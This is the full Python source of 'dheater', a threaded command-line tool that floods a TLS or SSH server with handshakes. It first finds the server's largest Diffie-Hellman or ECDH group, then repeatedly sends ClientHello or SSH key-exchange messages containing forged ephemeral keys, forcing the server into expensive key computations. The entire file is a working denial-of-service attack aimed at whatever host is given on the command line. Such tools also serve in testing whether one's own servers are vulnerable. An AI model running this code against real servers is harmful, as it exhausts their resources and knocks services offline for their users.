#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import time
import socket
import struct
import threading

from collections import deque
from operator import methodcaller

import abc
import attr
import urllib3

from cryptodatahub.common.algorithm import Authentication, KeyExchange
from cryptodatahub.common.exception import InvalidValue
from cryptodatahub.common.parameter import DHParamWellKnown
from cryptodatahub.common.types import convert_enum

from cryptodatahub.tls.algorithm import TlsCipherSuite, TlsNamedCurve, TlsSignatureAndHashAlgorithm
from cryptodatahub.tls.version import TlsVersion

from cryptodatahub.ssh.algorithm import SshKexAlgorithm

from cryptoparser.common.exception import InvalidType, NotEnoughData

from cryptoparser.tls.extension import (
    TlsExtensionsClient,
    TlsExtensionEllipticCurves,
    TlsExtensionKeyShareClient,
    TlsExtensionKeyShareReservedClient,
    TlsExtensionType,
)
from cryptoparser.tls.record import TlsRecord
from cryptoparser.tls.subprotocol import TlsHandshakeType
from cryptoparser.tls.version import TlsProtocolVersion

from cryptoparser.ssh.record import SshRecordInit, SshRecordKexDH, SshRecordKexDHGroup
from cryptoparser.ssh.subprotocol import (
    SshProtocolMessage,
    SshDHGroupExchangeInit,
    SshDHGroupExchangeRequest,
    SshDHKeyExchangeInit,
)
from cryptoparser.ssh.version import SshSoftwareVersionUnparsed, SshProtocolVersion, SshVersion

from cryptolyzer.common.dhparam import (
    DHPublicKey,
    get_dh_ephemeral_key_forged,
    get_ecdh_ephemeral_key_forged,
    int_to_bytes,
    parse_tls_dh_params
)
from cryptolyzer.common.exception import SecurityError, NetworkError
from cryptolyzer.common.transfer import L4ClientTCP, L4TransferSocketParams
import cryptolyzer.tls.versions
from cryptolyzer.tls.client import (
    L7ClientTlsBase,
    TlsHandshakeClientHelloKeyExchangeDHE,
    TlsHandshakeClientHelloKeyExchangeECDHx,
    key_share_entry_from_named_curve,
)
from cryptolyzer.tls.exception import TlsAlert
import cryptolyzer.tls.curves
import cryptolyzer.tls.dhparams
import cryptolyzer.ssh.dhparams
import cryptolyzer.ssh.ciphers
from cryptolyzer.ssh.client import (
    L7ClientSsh,
    SshKeyExchangeInitAnyAlgorithm,
)

from dheater.__setup__ import __title__, __version__


@attr.s
class DHEPreCheckResultBase():
    enforcable_key_size = attr.ib(
        converter=attr.converters.optional(int), validator=attr.validators.optional(attr.validators.instance_of(int))
    )
    key_exchange = attr.ib(validator=attr.validators.instance_of(KeyExchange))

    @property
    @abc.abstractmethod
    def key_size(self):
        raise NotImplementedError()

    @property
    @abc.abstractmethod
    def key_param_name(self):
        raise NotImplementedError()

    @property
    @abc.abstractmethod
    def algorithm_name(self):
        raise NotImplementedError()


@attr.s(eq=False)
class DHEnforcerThreadStats():  # pylint: disable=too-few-public-methods
    failed_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    succeeded_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    sent_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    received_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    time_interval = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))


@attr.s(eq=False)
class DHEnforcerThreadBase(threading.Thread):  # pylint: disable=too-many-instance-attributes
    uri = attr.ib(validator=attr.validators.instance_of(urllib3.util.url.Url))
    timeout = attr.ib(converter=float, validator=attr.validators.instance_of(float))
    key_exchange = attr.ib(converter=convert_enum(KeyExchange), validator=attr.validators.instance_of(KeyExchange))
    enforcable_key_size = attr.ib(
        converter=attr.converters.optional(int), validator=attr.validators.optional(attr.validators.instance_of(int))
    )
    pre_check_result = attr.ib(default=None)
    message_bytes = attr.ib(init=False, default=bytearray(), validator=attr.validators.instance_of(bytearray))
    stats = attr.ib(
        init=False, default=DHEnforcerThreadStats(), validator=attr.validators.instance_of(DHEnforcerThreadStats)
    )
    _stop_event = attr.ib(init=False, default=None)

    @pre_check_result.validator
    def pre_check_result_validator(self, attribute, value):  # pylint: disable=unused-argument
        if value is not None and not isinstance(value, self._get_pre_check_type()):
            raise ValueError()

    @abc.abstractmethod
    def _get_client(self, timeout=None):
        raise NotImplementedError()

    @abc.abstractmethod
    def _prepare_packets(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _send_packets(self, client):
        raise NotImplementedError()

    @classmethod
    @abc.abstractmethod
    def _get_pre_check_type(cls):
        raise NotImplementedError()

    @abc.abstractmethod
    def _pre_check_init(self):
        raise NotImplementedError()

    def _pre_check_ffdhe(self, pre_check_init_result):
        raise NotImplementedError()

    def _pre_check_ecdhe(self, pre_check_init_result):
        raise NotImplementedError()

    def _pre_check(self):
        pre_check_init_result = self._pre_check_init()
        if self.key_exchange == KeyExchange.DHE:
            self._pre_check_ffdhe(pre_check_init_result)
        else:
            self._pre_check_ecdhe(pre_check_init_result)

    def __attrs_post_init__(self):
        if self.pre_check_result is None:
            self._pre_check()

        threading.Thread.__init__(self)
        self._stop_event = threading.Event()

        self.message_bytes = self._prepare_packets()

    def stop(self):
        self._stop_event.set()

    @property
    def stopped(self):
        return self._stop_event.is_set()

    def run(self):
        start_time = time.time()
        while not self.stopped:
            try:
                client = self._get_client()
                client.init_connection()
                sent_byte_count, received_byte_count = self._send_packets(client)
            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError, NotEnoughData):
                self.stats.failed_request_num += 1
            else:
                self.stats.received_byte_count += received_byte_count
                self.stats.sent_byte_count += sent_byte_count
                self.stats.succeeded_request_num += 1
        end_time = time.time()

        self.stats.time_interval = end_time - start_time


@attr.s
class DHEPreCheckResultSSH(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
    protocol_version = attr.ib(validator=attr.validators.instance_of(SshProtocolVersion))
    ciphers_result = attr.ib(validator=attr.validators.instance_of(cryptolyzer.ssh.ciphers.AnalyzerResultCiphers))
    dhparams_result = attr.ib(
        validator=attr.validators.optional(attr.validators.instance_of(cryptolyzer.ssh.dhparams.AnalyzerResultDHParams))
    )

    def _get_key_size_and_algorithm_ffdhe(self):
        dhparams_result = self.dhparams_result
        algorithm = None
        key_size = None
        if dhparams_result.key_exchange:
            kex_algorithms = dhparams_result.key_exchange.kex_algorithms
            if self.enforcable_key_size is not None:
                kex_algorithms = [
                    algorithm
                    for algorithm in dhparams_result.key_exchange.kex_algorithms
                    if self.enforcable_key_size == algorithm.value.key_size
                ]

            if kex_algorithms:
                algorithm = sorted(
                    kex_algorithms,
                    key=lambda algorithm: algorithm.value.key_size,
                    reverse=True
                )[0]
                key_size = algorithm.value.key_size

        if dhparams_result.group_exchange:
            if self.enforcable_key_size is None:
                if key_size is None or dhparams_result.group_exchange.key_sizes[-1].value > key_size:
                    algorithm = dhparams_result.group_exchange.gex_algorithms[0]
                    key_size = dhparams_result.group_exchange.key_sizes[-1].value
            else:
                if key_size is None or self.enforcable_key_size in dhparams_result.group_exchange.key_sizes.value:
                    algorithm = dhparams_result.group_exchange.gex_algorithms[0]
                    key_size = self.enforcable_key_size

        if key_size is None:
            raise NotImplementedError()

        return key_size, algorithm

    def _get_key_size_and_algorithm_ecdhe(self):
        algorithm = sorted(
            filter(
                lambda kex_algorithm: (
                    isinstance(kex_algorithm, SshKexAlgorithm) and
                    kex_algorithm.value.kex == KeyExchange.ECDHE
                ),
                self.ciphers_result.kex_algorithms
            ),
            key=lambda algorithm: algorithm.value.key_size,
            reverse=True
        )[0]
        key_size = algorithm.value.key_size

        return key_size, algorithm

    def get_key_size_and_algorithm(self):
        if self.key_exchange == KeyExchange.DHE:
            key_size, algorithm = self._get_key_size_and_algorithm_ffdhe()
        else:
            key_size, algorithm = self._get_key_size_and_algorithm_ecdhe()

        return key_size, algorithm

    @property
    def key_size(self):
        key_size, _ = self.get_key_size_and_algorithm()

        return key_size

    @property
    def key_param_name(self):
        _, algorithm_with_greatest_key_size = self.get_key_size_and_algorithm()

        return algorithm_with_greatest_key_size.value.key_parameter.value

    @property
    def algorithm_name(self):
        _, algorithm_with_greatest_key_size = self.get_key_size_and_algorithm()

        return algorithm_with_greatest_key_size.value.code


class DHEnforcerThreadSSH(DHEnforcerThreadBase):
    group_exchange = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))

    @classmethod
    def _get_pre_check_type(cls):
        return DHEPreCheckResultSSH

    def _pre_check_init(self):
        analyzer = cryptolyzer.ssh.dhparams.AnalyzerCiphers()
        return analyzer.analyze(self._get_client())

    def _pre_check_ffdhe(self, pre_check_init_result):
        analyzer = cryptolyzer.ssh.dhparams.AnalyzerDHParams()
        dhparams_result = analyzer.analyze(self._get_client())
        if dhparams_result.key_exchange is None and dhparams_result.group_exchange is None:
            raise NotImplementedError()

        protocol_version = SshProtocolVersion(SshVersion.SSH2, 0)
        self.pre_check_result = DHEPreCheckResultSSH(
            self.enforcable_key_size, self.key_exchange, protocol_version, pre_check_init_result, dhparams_result
        )

    def _pre_check_ecdhe(self, pre_check_init_result):
        protocol_version = SshProtocolVersion(SshVersion.SSH2, 0)
        self.pre_check_result = DHEPreCheckResultSSH(
            self.enforcable_key_size, self.key_exchange, protocol_version, pre_check_init_result, None
        )

    def _get_client(self, timeout=None):
        if self.uri.scheme is None:
            scheme = 'ssh'
        else:
            scheme = self.uri.scheme

        if timeout is None:
            timeout = self.timeout

        return L7ClientSsh.from_scheme(
            scheme, self.uri.host, self.uri.port, L4TransferSocketParams(timeout=self.timeout)
        )

    @classmethod
    def _get_shortest_algorithm(cls, algorithms):
        return min(algorithms, key=lambda algorithm: len(algorithm.value.code))

    def _prepare_packets(self):
        message_bytes = bytearray()
        protocol_message = SshProtocolMessage(
            protocol_version=SshProtocolVersion(SshVersion.SSH2, 0),
            software_version=SshSoftwareVersionUnparsed(f'{__title__}_{__version__}'),
        )
        key_size, kex_algorithm = self.pre_check_result.get_key_size_and_algorithm()
        ciphers_result = self.pre_check_result.ciphers_result
        key_exchange_init_message = SshKeyExchangeInitAnyAlgorithm(
            kex_algorithms=[kex_algorithm, ],
            host_key_algorithms=[self._get_shortest_algorithm(ciphers_result.host_key_algorithms), ],
            encryption_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.encryption_algorithms_client_to_server),
            ],
            encryption_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.encryption_algorithms_server_to_client),
            ],
            mac_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.mac_algorithms_client_to_server),
            ],
            mac_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.mac_algorithms_server_to_client),
            ],
            compression_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.compression_algorithms_client_to_server),
            ],
            compression_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.compression_algorithms_server_to_client),
            ],
        )
        message_bytes += protocol_message.compose()

        message_bytes += SshRecordInit(key_exchange_init_message).compose()

        if self.key_exchange == KeyExchange.DHE:
            well_known_dh_param_with_matching_key_size = [
                well_known_dh_param
                for well_known_dh_param in DHParamWellKnown
                if well_known_dh_param.value.key_size == key_size
            ][0]
            dh_ephemeral_public_key = get_dh_ephemeral_key_forged(
                well_known_dh_param_with_matching_key_size.value.parameter_numbers.p
            )
            dh_ephemeral_public_key_bytes = int_to_bytes(dh_ephemeral_public_key, key_size)
        else:
            dh_ephemeral_public_key_bytes = get_ecdh_ephemeral_key_forged(kex_algorithm.value.key_parameter)

        dh_ephemeral_public_key_bytes = dh_ephemeral_public_key_bytes.lstrip(b'\x00')

        if kex_algorithm.value.key_size is not None:
            dh_key_exchange_init_message = SshDHKeyExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDH(dh_key_exchange_init_message).compose()
        else:
            self.group_exchange = True

            dh_group_exchange_request_message = SshDHGroupExchangeRequest(
                gex_min=key_size, gex_max=key_size, gex_number=key_size
            )
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_request_message).compose()

            dh_group_exchange_init_message = SshDHGroupExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_init_message).compose()

        return message_bytes

    @classmethod
    def _skip_record(cls, client):
        received_byte_count = client.l4_transfer.receive(4)
        received_byte_count += client.l4_transfer.receive(struct.unpack('!I', client.l4_transfer.buffer)[0])
        client.l4_transfer.flush_buffer()

        return received_byte_count

    def _send_packets(self, client):
        sent_byte_count = client.send(self.message_bytes)

        # Receive protocol version exchange
        received_byte_count = client.l4_transfer.receive_line()
        client.l4_transfer.flush_buffer()

        # Receive key exchange init message
        received_byte_count += self._skip_record(client)

        if self.group_exchange:
            # Wait for DH group exchange group message
            received_byte_count += self._skip_record(client)

        # Wait for DH group/key exchange reply by receiving record length
        received_byte_count += client.l4_transfer.receive(4)

        return sent_byte_count, received_byte_count


@attr.s
class DHEPreCheckResultTLS(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
    client_hello_class = attr.ib(validator=attr.validators.instance_of(type))
    dh_public_key = attr.ib(validator=attr.validators.instance_of((DHPublicKey, TlsNamedCurve)))
    protocol_version = attr.ib(validator=attr.validators.instance_of(TlsProtocolVersion))
    cipher_suite = attr.ib(validator=attr.validators.instance_of(TlsCipherSuite))
    receivable_byte_count = attr.ib(validator=attr.validators.instance_of(int))

    @property
    def key_size(self):
        if isinstance(self.dh_public_key, TlsNamedCurve):
            return self.dh_public_key.value.named_group.value.size

        return self.dh_public_key.key_size

    @property
    def key_param_name(self):
        if isinstance(self.dh_public_key, TlsNamedCurve):
            return str(self.dh_public_key.value.named_group.value)

        if isinstance(self.dh_public_key, DHPublicKey):
            try:
                return DHParamWellKnown.from_parameter_numbers(
                    self.dh_public_key.public_numbers.parameter_numbers
                ).value
            except InvalidValue:
                pass

        return 'custom DH paramater'

    @property
    def algorithm_name(self):
        return self.cipher_suite.name


class DHEnforcerThreadTLS(DHEnforcerThreadBase):
    @classmethod
    def _get_pre_check_type(cls):
        return DHEPreCheckResultTLS

    def _pre_check_init(self):
        timeout = L4ClientTCP.get_default_timeout()
        analyzer = cryptolyzer.tls.versions.AnalyzerVersions()
        return analyzer.analyze(self._get_client(timeout=timeout), None)

    @staticmethod
    def _get_receivable_byte_count(protocol_version, server_messages):
        handshake_messages_before_key_generation = [TlsHandshakeType.SERVER_HELLO]
        if protocol_version <= TlsProtocolVersion(TlsVersion.TLS1_2):
            handshake_messages_before_key_generation.append(TlsHandshakeType.CERTIFICATE)

        return sum(
            len(server_message.compose())
            for handshake_type, server_message in server_messages.items()
            if handshake_type in handshake_messages_before_key_generation
        ) + 1

    def _pre_check_named_groups(self, client_hello_class, protocol_version):
        named_curves = list(sorted(
            client_hello_class.NAMED_CURVES,
            key=lambda named_curve: named_curve.value.named_group.value.size, reverse=True
        ))
        if self.enforcable_key_size is not None:
            named_curves = list(filter(
                lambda named_curve: named_curve.value.named_group.value.size == self.enforcable_key_size,
                named_curves
            ))
        for named_curve in named_curves:
            client_hello = client_hello_class(
                protocol_version, self.uri.host, named_curves=[named_curve, ]
            )
            try:
                server_messages = self._get_client().do_tls_handshake(
                    client_hello, last_handshake_message_type=TlsHandshakeType.SERVER_HELLO
                )
            except (TlsAlert, NotEnoughData, NetworkError):
                continue
            else:
                return named_curve, server_messages

        return None, None

    def _pre_check_ecdhe(self, pre_check_init_result):
        protocol_version = max(pre_check_init_result.versions)
        named_curve, server_messages = self._pre_check_named_groups(
            TlsHandshakeClientHelloKeyExchangeECDHx, protocol_version
        )
        if named_curve is None:
            raise NotImplementedError()

        receivable_byte_count = self._get_receivable_byte_count(protocol_version, server_messages)
        self.pre_check_result = DHEPreCheckResultTLS(
            enforcable_key_size=self.enforcable_key_size,
            key_exchange=self.key_exchange,
            client_hello_class=TlsHandshakeClientHelloKeyExchangeECDHx,
            dh_public_key=named_curve,
            protocol_version=protocol_version,
            cipher_suite=server_messages[TlsHandshakeType.SERVER_HELLO].cipher_suite,
            receivable_byte_count=receivable_byte_count,
        )

    def _pre_check_ffdhe(self, pre_check_init_result):
        dh_public_key = None

        protocol_version = max(pre_check_init_result.versions)
        if protocol_version > TlsProtocolVersion(TlsVersion.TLS1_2):
            dh_public_key, server_messages = self._pre_check_named_groups(
                TlsHandshakeClientHelloKeyExchangeDHE, protocol_version
            )

        if dh_public_key is None:
            protocol_version = min(pre_check_init_result.versions)
            client_hello = TlsHandshakeClientHelloKeyExchangeDHE(protocol_version, self.uri.host)
            try:
                server_messages = self._get_client().do_tls_handshake(
                    client_hello, last_handshake_message_type=TlsHandshakeType.SERVER_KEY_EXCHANGE
                )
            except (TlsAlert, NotEnoughData) as e:
                raise NotImplementedError() from e

            if TlsHandshakeType.SERVER_KEY_EXCHANGE not in server_messages:
                raise NotImplementedError()

            dh_public_key = parse_tls_dh_params(server_messages[TlsHandshakeType.SERVER_KEY_EXCHANGE].param_bytes)
            if (dh_public_key is not None and self.enforcable_key_size is not None and
                    self.enforcable_key_size != dh_public_key.key_size):
                raise NotImplementedError()

        receivable_byte_count = self._get_receivable_byte_count(protocol_version, server_messages)
        self.pre_check_result = DHEPreCheckResultTLS(
            enforcable_key_size=self.enforcable_key_size,
            key_exchange=self.key_exchange,
            client_hello_class=TlsHandshakeClientHelloKeyExchangeDHE,
            dh_public_key=dh_public_key,
            protocol_version=protocol_version,
            cipher_suite=server_messages[TlsHandshakeType.SERVER_HELLO].cipher_suite,
            receivable_byte_count=receivable_byte_count,
        )

    def _get_client(self, timeout=None):
        if self.uri.scheme is None:
            scheme = 'tls'
        else:
            scheme = self.uri.scheme

        if timeout is None:
            timeout = self.timeout

        return L7ClientTlsBase.from_scheme(
            scheme, self.uri.host, self.uri.port, L4TransferSocketParams(timeout=timeout)
        )

    def _prepare_packets(self):
        extensions = []

        protocol_version = self.pre_check_result.protocol_version
        is_tls_1_3 = protocol_version > TlsProtocolVersion(TlsVersion.TLS1_2)

        if is_tls_1_3:
            signature_algorithms = None
            extensions.extend(
                self.pre_check_result.client_hello_class._get_tls1_3_extensions(  # pylint: disable=protected-access
                    [protocol_version, ], signature_algorithms
                )
            )
        else:
            cipher_suite = self.pre_check_result.cipher_suite
            if cipher_suite.value.authentication == Authentication.RSA:
                signature_algorithms = [
                    TlsSignatureAndHashAlgorithm.RSA_SHA256,
                    TlsSignatureAndHashAlgorithm.RSA_SHA1,
                ]
            elif cipher_suite.value.authentication == Authentication.ECDSA:
                signature_algorithms = [
                    TlsSignatureAndHashAlgorithm.ECDSA_SHA256,
                    TlsSignatureAndHashAlgorithm.ECDSA_SHA1,
                ]

        if self.key_exchange == KeyExchange.ECDHE or is_tls_1_3:
            named_curves = [self.pre_check_result.dh_public_key, ]
            extensions.append(TlsExtensionEllipticCurves(named_curves))
        else:
            named_curves = []

        client_hello = self.pre_check_result.client_hello_class(
            protocol_version=protocol_version,
            hostname=self.uri.host,
            named_curves=named_curves,
        )

        if is_tls_1_3:
            extensions = [
                extension
                for extension in client_hello.extensions
                if extension.extension_type not in (TlsExtensionType.KEY_SHARE, TlsExtensionType.KEY_SHARE_RESERVED)
            ]

            key_share_entry = key_share_entry_from_named_curve(self.pre_check_result.dh_public_key)
            client_hello.extensions = TlsExtensionsClient(extensions + [
                TlsExtensionKeyShareClient([key_share_entry]),
                TlsExtensionKeyShareReservedClient([key_share_entry]),
            ])

        client_hello_bytes = TlsRecord(client_hello.compose()).compose()

        return client_hello_bytes

    def _send_packets(self, client):
        sent_byte_count = client.send(self.message_bytes)

        received_byte_count = 0
        while received_byte_count <= self.pre_check_result.receivable_byte_count:
            # Receive TLS record header bytes
            if len(client.l4_transfer.buffer) < TlsRecord.HEADER_SIZE:
                client.l4_transfer.receive(TlsRecord.HEADER_SIZE - len(client.l4_transfer.buffer))

            # Recceive remaining part of the TLS record
            record_length = struct.unpack('!H', client.l4_transfer.buffer[3:5])[0]
            client.l4_transfer.flush_buffer(TlsRecord.HEADER_SIZE)
            if len(client.l4_transfer.buffer) < record_length:
                client.l4_transfer.receive(record_length - len(client.l4_transfer.buffer))
            client.l4_transfer.flush_buffer(record_length)

            # Add record length only to the received byte count as TLS messages may come in different number of records
            received_byte_count += record_length

        return sent_byte_count, received_byte_count


class ParseURI(argparse.Action):  # pylint: disable=too-few-public-methods
    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        super().__init__(option_strings, dest, **kwargs)

    def __call__(self, parser, namespace, values, option_string=None):
        try:
            namespace.uri = urllib3.util.parse_url(values)
        except urllib3.exceptions.LocationParseError as e:
            raise argparse.ArgumentError(self, e.args[0])


def main():
    parser = argparse.ArgumentParser(description='Diffie-Hellman ephemeral key exchange enforcer')
    parser.add_argument(
        '--timeout', dest='timeout', default=L4ClientTCP.get_default_timeout(), type=float,
        help='socket timeout in seconds (default: %(default)ss)'
    )
    parser.add_argument(
        '--thread-num', dest='thread_num', default=1, type=int,
        help='number of threads to run (default: %(default)s)'
    )
    parser.add_argument(
        '--key-size', dest='key_size', default=None, type=int,
        help='key size to enforce (default: %(default)s)'
    )
    parser.add_argument(
        '--protocol', dest='protocol', required=True, choices=['tls', 'ssh', ], help='name of the protocol'
    )
    parser.add_argument(
        '--key-exchange', dest='key_exchange', default='DHE', choices=['DHE', 'ECDHE', ],
        help='type of the Diffie-Hellman key exchnage %(default)s'
    )
    parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')

    args = parser.parse_args()
    threads = []

    try:
        pre_check_result = None
        for _ in range(args.thread_num):
            enforcer_class = None
            try:
                if args.protocol == 'tls':
                    enforcer_class = DHEnforcerThreadTLS
                elif args.protocol == 'ssh':
                    enforcer_class = DHEnforcerThreadSSH

                enforcer = enforcer_class(args.uri, args.timeout, args.key_exchange, args.key_size, pre_check_result)
            except NetworkError as e:
                if pre_check_result is None:
                    print(
                        f'Network error occurred while checking whether Diffie-Hellman ephemeral key exchange '
                        f'is supported by the server; uri="{args.uri}", error="{e}"'
                    )
                    return

                raise e from e

            pre_check_result = enforcer.pre_check_result
            threads.append(enforcer)

        deque(map(methodcaller('start'), threads))

        client = threads[0]._get_client()  # pylint: disable=protected-access
        print(os.linesep.join([
            '### Software',
            '',
            '    * Version: {}',
            '',
            '### Arguments',
            '',
            '    * Thread num: {}',
            '    * Protocol: {}',
            '    * Address: {}',
            '',
            '### Service',
            '',
            '    * IP: {}',
            '    * Port: {}',
            '    * Key parameter: {}',
            '    * Key size: {}',
            '    * Algorithm: {}',
        ]).format(
            __version__,
            args.thread_num,
            pre_check_result.protocol_version,
            client.address,
            client.ip,
            client.port,
            pre_check_result.key_param_name,
            pre_check_result.key_size,
            pre_check_result.algorithm_name,
        ))

        while True:
            time.sleep(0.2)
    except NotImplementedError:
        print(
            f'Diffie-Hellman ephemeral (DHE) key exchange (with the given key size) not supported by the server; '
            f'uri="{args.uri}", protocol="{args.protocol}"'
        )
    except KeyboardInterrupt:
        deque(map(methodcaller('stop'), threads))
        deque(map(methodcaller('join'), threads))


if __name__ == '__main__':
    main()
